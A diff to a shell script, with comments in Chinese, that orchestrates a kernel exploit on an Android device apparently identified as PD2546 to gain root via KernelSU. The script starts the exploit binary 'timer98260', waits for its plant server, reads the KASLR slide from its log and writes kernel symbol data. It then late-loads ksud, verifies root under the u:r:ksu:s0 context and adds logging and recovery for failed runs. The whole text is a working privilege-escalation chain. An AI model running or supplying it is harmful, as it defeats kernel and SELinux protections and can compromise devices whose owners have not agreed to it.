@@ -26,8 +26,14 @@ MODULE_NOTIFY_LIST=ffffffc0825d7d28
 TRACE_MODULE_NOTIFY=ffffffc08057d2a4
 TRACE_SYS_EXIT=ffffffc0826d93e0
 
-say() { echo "$*"; }
-die() { echo "[X] $*"; exit 2; }
+# 所有 say 的东西同时攒一份到 $RUNLOG：App 端日志浮层要是没弹出来，
+# 事后用「拉取设备端状态」或 adb 直接 cat 这个文件就能看到跑到了哪一步。
+RUNLOG="$D/run.log"
+BUF=""
+say() { BUF="$BUF$*
+"; echo "$*"; }
+dump_log() { printf '%s' "$BUF" > "$RUNLOG" 2>/dev/null; }
+die() { say "[X] $*"; dump_log; exit 2; }
 
 # ---------- 32 位分半的十六进制运算（全内建，不 fork） ----------
 HEXD=0123456789abcdef
@@ -124,6 +130,9 @@ zero_check() { # $1=标签
 }
 
 # ---------- 0. 环境 ----------
+rm -f "$RUNLOG"
+say "== PD2546 设备端重 root · $(date '+%m-%d %H:%M:%S' 2>/dev/null) =="
+say "  App 端日志浮层看不到东西时，跑完到这里 cat $RUNLOG"
 say "[1/7] 环境检查"
 say "  id=$(id)"
 [ "$(id -u)" = "2000" ] || say "[!] 不是 uid=2000，请确认在 rish 里运行"
@@ -145,41 +154,78 @@ case "$KV" in
     ;;
 esac
 
-for f in timer98260 ksud probe fake_shell.sh symbols.txt; do
+for f in timer98260 ksud probe fake_shell.sh ksu_stage.sh symbols.txt; do
   if [ ! -f "$D/$f" ]; then
     [ -f "$SRC/$f" ] || die "缺少 $SRC/$f（先把解压出来的 linux/files 放到 /sdcard/Download/pd2546/）"
     cp -f "$SRC/$f" "$D/$f" || die "拷贝 $f 失败"
   fi
 done
-chmod 755 "$D/timer98260" "$D/ksud" "$D/probe" "$D/fake_shell.sh"
+chmod 755 "$D/timer98260" "$D/ksud" "$D/probe" "$D/fake_shell.sh" "$D/ksu_stage.sh"
+say "  设备上实际的文件："
+for f in timer98260 ksud probe fake_shell.sh ksu_stage.sh symbols.txt; do
+  say "    $f  $(wc -c < "$D/$f" 2>/dev/null | tr -d ' ') 字节"
+done
 mkdir -p "$CH"; chmod 777 "$CH"
 printf 1 > "$CH/kptr_0000"; chmod 666 "$CH/kptr_0000"
 rm -f "$CH/plant_req" "$CH/plant_done" "$CH/plant_res" "$CH/run" "$CH/run.new" "$CH/busy"
 
+REUSE=0
 if ps -A -o PID,NAME 2>/dev/null | grep -q '[t]imer98260'; then
-  say "[X] 已有 timer98260 在跑。先重启手机再跑本脚本，否则释放 fake 页会 panic。"
-  exit 2
+  if grep -aq 'plant server ready' "$LOG" 2>/dev/null; then
+    REUSE=1
+    say "[i] 检测到 plant server 仍在运行，复用现有实例（跳过部署/启动）。"
+  else
+    say "[X] 已有 timer98260 在跑，但 fakeR.log 里没有 plant server ready。"
+    say "    上一轮跑到一半挂了，内核状态是脏的 —— 先重启手机，再点一次。"
+    say "---- fakeR.log 最后 12 行 ----"
+    tail -n 12 "$LOG" 2>/dev/null > "$D/.pd_tail"
+    while IFS= read -r _l; do say "  $_l"; done < "$D/.pd_tail"
+    rm -f "$D/.pd_tail"
+    dump_log
+    exit 2
+  fi
 fi
 
 # ---------- 1. 起 exploit ----------
-say "[2/7] 启动 fake exploit（setsid 脱离当前 shell）"
-cd "$D" || die "进不去 $D"
-rm -f "$LOG"
-setsid sh -c 'nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null &' 2>/dev/null \
-  || { nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null & }
+if [ "$REUSE" = "1" ]; then
+  say "[2/7] 跳过启动，直接用已经在跑的 exploit"
+else
+  say "[2/7] 启动 fake exploit（setsid 脱离当前 shell）"
+  say "  注意：这一步起 timer98260 常驻，失败只能重启手机再来。"
+  cd "$D" || die "进不去 $D"
+  rm -f "$LOG"
+  setsid sh -c 'nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null &' 2>/dev/null \
+    || { nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null & }
+  say "  等待 plant server ready（最长 2.5 分钟）…"
 
-ready=0; parked=0; _w=0
-while [ $_w -lt 60 ]; do
-  sleep 3; _w=$((_w + 1))
-  if grep -aq 'plant server ready' "$LOG"; then ready=1; break; fi
-  if grep -aq 'parking without reap' "$LOG"; then parked=1; break; fi
-done
-if [ "$ready" != "1" ]; then
-  say "[X] 这一轮没成功（parked=$parked），重启手机后再跑一次。"
-  tail -5 "$LOG" 2>/dev/null
-  exit 1
+  ready=0; parked=0; _w=0
+  while [ $_w -lt 30 ]; do
+    sleep 5; _w=$((_w + 1))
+    if grep -aq 'plant server ready' "$LOG"; then ready=1; break; fi
+    if grep -aq 'parking without reap' "$LOG"; then parked=1; break; fi
+    case $_w in
+      2|4|6|8|10|12|15|18|21|24|27)
+        say "  ...已等 $((_w * 5)) 秒（fakeR.log $(wc -c < "$LOG" 2>/dev/null | tr -d ' ') 字节）" ;;
+    esac
+  done
+  if [ "$ready" != "1" ]; then
+    say "[X] exploit 没起来（parked=$parked）—— 这一轮不会成功。"
+    say "---- fakeR.log 最后 15 行（这就是它卡住的原因）----"
+    tail -n 15 "$LOG" 2>/dev/null > "$D/.pd_tail"
+    while IFS= read -r _l; do say "  $_l"; done < "$D/.pd_tail"
+    rm -f "$D/.pd_tail"
+    say "---- 结束 ----"
+    case "$parked" in
+      1) say "[!] parking without reap：fake 页被僵尸占住，必须重启手机才干净。" ;;
+      *) say "[!] 一行都没有 = 二进制根本没跑起来（权限/架构/tmp 挂载）；" ;
+         say "    有几行停在 [cred]/[base] = fake 凭据那一步没打穿，先重启再试。" ;;
+    esac
+    dump_log
+    exit 1
+  fi
 fi
-SLIDE=$(grep -o 'slide=0x[0-9a-f]*' "$LOG" | head -1 | sed 's/.*0x//')
+
+SLIDE=$(grep -o 'slide=0x[0-9a-f]*' "$LOG" 2>/dev/null | tail -1 | sed 's/.*0x//')
 [ -n "$SLIDE" ] || die "日志里没有 slide"
 SLIDE_DEC=$((0x$SLIDE))
 say "  READY slide=0x$SLIDE"
@@ -299,40 +345,56 @@ done < "$D/symbols.txt" > "$D/kall"
 say "  KALLSYMS_OK $(wc -l < "$D/kall" | tr -d ' ')"
 
 # ---------- 6. late-load ----------
-say "[7/7] ksud late-load"
+say "[7/7] ksud late-load（install → late-load → 等 /proc/modules）"
 {
   echo 'echo ===LOAD==='
   echo 'id'
   echo 'cat /sys/module/module/parameters/sig_enforce'
   echo 'mkdir -p /data/adb'
-  echo "cp $D/kall /data/adb/kall"
-  echo 'chmod 644 /data/adb/kall'
-  echo "$D/ksud late-load --kmi $KMI --allow-shell --package-name $PKG"
+  echo "cp $D/kall /data/adb/kall 2>/dev/null"
+  echo 'chmod 644 /data/adb/kall 2>/dev/null'
+  echo "PD_PKG=$PKG PD_KMI=$KMI PD_D=$D /system/bin/sh $D/ksu_stage.sh"
   echo 'echo LATE_RC=$?'
   echo 'sleep 2'
   echo 'grep kernelsu /proc/modules'
+  echo 'id'
+  echo 'getenforce'
   echo 'echo ===LOAD_END==='
 } | write_run
 _w=0
 while [ $_w -lt 40 ]; do
   sleep 3; _w=$((_w + 1))
   grep -aq '===LOAD_END===' "$LOG" && break
+  case $_w in
+    3|6|9|12) say "  ...late-load 进行中（$((_w * 3)) 秒）" ;;
+  esac
 done
 sleep 2
 
 say ''
+say "---- late-load 输出（来自设备端 fakeR.log）----"
+awk '/===LOAD===/{f=1} f' "$LOG" 2>/dev/null | head -n 40 > "$D/.pd_load"
+while IFS= read -r _l; do say "  $_l"; done < "$D/.pd_load"
+rm -f "$D/.pd_load"
+say "---- ----"
+
+say ''
 say "=== 验证 ==="
-grep -a 'LATE_RC' "$LOG" | tail -1
-grep -a 'kernelsu' "$LOG" | tail -1
+say "$(grep -a 'LATE_RC' "$LOG" | tail -1)"
+say "$(grep -a 'KSU_LOADED\|KSU_MISSING\|\[ksu\] late-load' "$LOG" | tail -3)"
+say "$(grep -a 'kernelsu' "$LOG" | tail -1)"
 OUT=$(grep kernelsu /proc/modules 2>/dev/null; su -c id 2>&1 | head -1; getenforce 2>/dev/null)
-echo "$OUT"
+say "$OUT"
 case "$OUT" in
   *kernelsu*u:r:ksu:s0*)
     say ''
     say '========================================'
     say '  KSU_ROOT_OK  root 已就绪（u:r:ksu:s0）'
     say '========================================'
+    dump_log
     exit 0 ;;
 esac
 say "[X] 验证没通过。确认管理器 $PKG 已安装且与 ksud 版本一致，再重跑。"
+say "    （kernelsu 已加载但拿不到 su：多半是 ksud 与管理器版本不一致）"
+dump_log
 exit 1
